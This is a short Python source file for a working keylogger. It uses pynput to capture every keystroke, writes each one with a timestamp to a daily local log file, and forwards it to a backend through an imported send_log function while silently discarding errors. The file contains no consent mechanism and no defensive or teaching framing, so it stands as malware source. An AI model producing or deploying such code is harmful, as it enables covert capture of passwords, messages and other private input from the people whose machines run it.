from pynput import keyboard
import os
from datetime import datetime
from send_data import send_log  # ✅ Import the backend sender

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
log_file = os.path.join(LOG_DIR, f"log_{datetime.now().date()}.txt")
DEVICE_ID = "PC001"  # (Optional) You can generate this per system

def on_press(key):
    try:
        key_char = key.char
    except AttributeError:
        key_char = f"[{key}]"

    # Compose the log line
    timestamp = datetime.now()
    log_line = f"{timestamp} - {key_char}"

    # ✅ 1. Save locally
    with open(log_file, "a") as f:
        f.write(log_line + "\n")

    # ✅ 2. Send to backend
    try:
        send_log(log_char=key_char, timestamp=timestamp)
    except Exception as e:
        # Optional: print or log to file
        pass

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
